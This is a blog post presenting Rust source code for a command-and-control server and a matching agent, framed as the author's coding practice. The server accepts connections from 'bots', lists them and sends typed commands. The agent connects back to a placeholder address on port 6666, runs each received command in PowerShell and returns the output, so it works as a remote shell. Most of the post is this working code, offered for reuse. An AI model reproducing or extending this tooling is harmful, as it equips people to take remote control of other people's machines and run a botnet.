---
layout: post
title:  C2 Server & Agent - Rust Coding Practice
categories: [Rust,Code]
---

Hi all, nowadays I'm writing Rust to learn and improve my coding skills. In this post, you will see C2 server and agent basically.
You can pm me on [twitter](https://twitter.com/batwareman) for bugs and anything else.
Maybe a few weeks later i can update code, adding new things to improve agent and server. You can list dead, and alive bots and interact with them and also kill bots.
Agent runs commands on Powershell. 


server.rs
```rust
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
pub fn help_menu() {
    println!(
        "List bots           bots
Interact to bot     interact
Which one:"
    );
}

pub fn srv() {
    // Create a map to store the list of connected bots
    let bots: Arc<Mutex<HashMap<String, TcpStream>>> = Arc::new(Mutex::new(HashMap::new()));
    // Create a thread-safe reference to the list of bots
    let bots_clone = bots.clone();

    // Start a new thread to listen for incoming connections
    thread::spawn(move || {
        let listener = TcpListener::bind("0.0.0.0:6666").unwrap();
        // Accept connections in a loop
        for stream in listener.incoming() {
            let stream = stream.unwrap();
            // Add the new bot to the list of connected bots
            let mut bots = bots_clone.lock().unwrap();
            let bot_id = stream.peer_addr().unwrap().to_string();

            bots.insert(bot_id, stream);
        }
    });
    'main_loop: loop {
        let mut input = String::new();
        println!("🔗> Maybe help: ");
        std::io::stdin().read_line(&mut input).unwrap();
        match input.trim() {
            "help" => help_menu(),
            "bots" => {
                let mut buffer = [0; 1024];
                //list all bots
                let bots = bots.lock().unwrap();
                if bots.is_empty() == true {
                    println!("Bot not found");
                    continue 'main_loop;
                } else {
                    for (i, (bot_id, mut stream)) in bots.iter().enumerate() {
                        if stream.write_all("wbu".as_bytes()).is_err() {
                            println!("{}: {} - Dead", i, bot_id);
                        } else {
                            stream.read(&mut buffer).unwrap();
                            println!("{}: {} - Active", i, bot_id);
                        }
                    }
                }
            }
            "interact" => {
                //interact to bot
                let mut bots = bots.lock().unwrap();
                let mut input = String::new();
                println!("🔗> Enter bot number you want to interact or back menu(exit): ");
                std::io::stdin().read_line(&mut input).expect("Wrong Input");
                if input.trim() == "quit" {
                    continue 'main_loop;
                } else {
                    let bot_index: usize = input.trim().parse().unwrap();
                    let selected_bot = bots.values().nth(bot_index);
                    'bot_loop: loop {
                        let mut buffer = [0; 99999];
                        if let Some(mut stream) = selected_bot {
                            let mut input = String::new();
                            println!("🔗Powershell Prompt> ");
                            std::io::stdin().read_line(&mut input).unwrap();
                            if input.trim() == "exit" {
                                continue 'main_loop;
                            } else if input.trim() == "kill" {
                                let selected_bot = bots.values().nth(bot_index);
                                let mut sel_bot = String::new();
                                for addr in selected_bot.into_iter() {
                                    sel_bot = addr.peer_addr().unwrap().to_string();
                                }
                                if let Some(mut stream) = selected_bot {
                                    stream.write_all("kill".as_bytes()).unwrap();
                                    bots.remove(&sel_bot);
                                    continue 'main_loop;
                                }
                            } else if stream.write_all(input.as_bytes()).is_err() {
                                println!("Connection Closed");
                                continue 'main_loop;
                            } else {
                                stream.read(&mut buffer).unwrap();
                                println!("{}", String::from_utf8_lossy(&buffer[..]));
                                continue 'bot_loop;
                            }
                        } else {
                            println!("Bot not found");
                            continue 'main_loop;
                        }
                    }
                }
            }
            _ => println!("Wrong choice"),
        }
    }
}

```

main.rs
```rust
use async_std::task;

mod server;

async fn c2_cli() {
    server::srv();
}

#[async_std::main]
async fn main() {
    task::spawn(c2_cli()).await;
}

```

Agent

main.rs

```rust
use async_process::Command;
use async_std::{
    net::{TcpStream, ToSocketAddrs},
    prelude::*,
    task,
};
use std::{error::Error, result::Result};

#[async_std::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    task::block_on(try_run("ip:6666"))
}
async fn try_run(addr: impl ToSocketAddrs) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut stream = TcpStream::connect(addr).await?;

    'myloop: loop {
        let mut command = [0; 9999];
        stream.read(&mut command).await?;
        let cmd_command = String::from_utf8_lossy(&command[..]).to_string();
        let result_command = cmd_command.trim_matches(char::from(0));
        if result_command == "wbu"{
            stream.write_all("Active".as_bytes()).await?;
        }else {
            let output = Command::new("powershell")
            // .arg("/C")
             .arg(result_command)
             .output()
             .await;
         
         let result = match output {
             Ok(output) => {
                 if !output.stderr.is_empty() {
                     //   println!("{}", &String::from_utf8_lossy(&output.stderr).to_string());
                     stream.write_all("Wrong Command".as_bytes()).await?;
                     continue 'myloop;
                 } else {
                     let result = output.stdout;
                     let stdout = String::from_utf8(result).expect("invalid utf8 output");
                     let res = stdout.trim_matches(char::from(0));
                     stream.write_all(res.as_bytes()).await?;
                     continue 'myloop;
                 }
             }
             Err(_) => stream.write_all("Wrong Command".as_bytes()),
         };
        }

    }
}

```

![](/images/1.PNG)
![](/images/2.PNG)
![](/images/Screenshot-4.png)


